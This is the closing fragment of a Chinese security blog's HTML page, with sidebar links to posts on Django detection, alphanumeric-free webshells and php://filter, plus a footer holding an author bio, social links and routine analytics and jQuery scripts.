        <li><a href="detect-django.html">如何判断目标站点是否为Django开发</a></li>
    
        <li><a href="webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></li>
    
        <li><a href="webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></li>
    
        <li><a href="php-filter-magic.html">谈一谈php://filter的妙用</a></li>
    
    </ul>
  </div>
  

</div>
</div>

<div id="footer">
	<!-- copyright -->
	<div class="container">
		<div class="row remove-bottom">
			<div class="col-6 columns">
			<h3>Little About</h3>
			<p>Phithon 非强迫症小青年  <br>
现居先 <br>
爱好：种花、买书、收藏明信片 <br>
欢迎各大组织收留 <br>
E-mail：root@leavesongs.com </p>
			</div>

			<div class="col-10 columns">

				<h3 class="mobile-hide">Follow me</h3>
        <div id="social-links">
          <a href="http://weibo.com/101yx" class="sweibo" target="_blank" title="新浪微博">新浪微博</a>
          <a href="javascript:alert(/没有腾讯微博哟/)" class="qweibo" target="_blank" title="腾讯微博">腾讯微博</a>
          <a href="javascript:alert(/墙外有什么/);window.open('http://google.com')" class="google" target="_blank" title="墙外的世界">google+</a>
          <a href="https://github.com/phith0n" class="github" target="_blank" title="Github">github</a>
          <a href="javascript:confirm(/mailto:root#leavesongs.com/)" class="mail" target="_blank" title="私信给我">私信给我</a>
          <a href="../feed/index.rss" target="_blank" class="rss" title="离别歌">RSS订阅</a>
        </div>
        <div class="bot-line"></div>
				<p class="copyright">
	Copyright &copy; Powered by talkbook
				&nbsp;&nbsp;<i>Designed and built with all the love in the world by <a href="../index.html" target="_blank">Phithon</a> && deepsky </i>
                    <a href="../index.html">更换模板</a>
				</p>
			</div>
		</div>
	</div>
	<!-- /copyright -->
</div>
<a href="#" id="go-top">Top ↑</a>
<script src="https://cdn.staticfile.org/jquery/1.12.4/jquery.min.js"></script>
<script src="https://cdn.staticfile.org/jquery.appear/0.4.1/jquery.appear.min.js"></script>
<script src="../static/deep/js/common_tpl.js" type="text/javascript"></script>
<script src="../static/deep/js/config.js"></script>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-FF5KPQ1CZ6"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-FF5KPQ1CZ6');
</script>

<script src="https://cdn.staticfile.org/fancybox/2.1.7/js/jquery.fancybox.min.js"></script>
<script>
$(document).ready(function () {
    $(".entry a").each(function (i, e) {
        if(e.host != 'www.leavesongs.com') {
            e.target = '_blank';
        }
    });
    $(".entry img").each(function (i, e) {
        if(e.parentNode.tagName.toUpperCase() != 'A') {
            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
        } else {
            $(e.parentNode).addClass('fancybox');
        }
    });
    $('.fancybox').fancybox();
})
</script>

</body>

</html>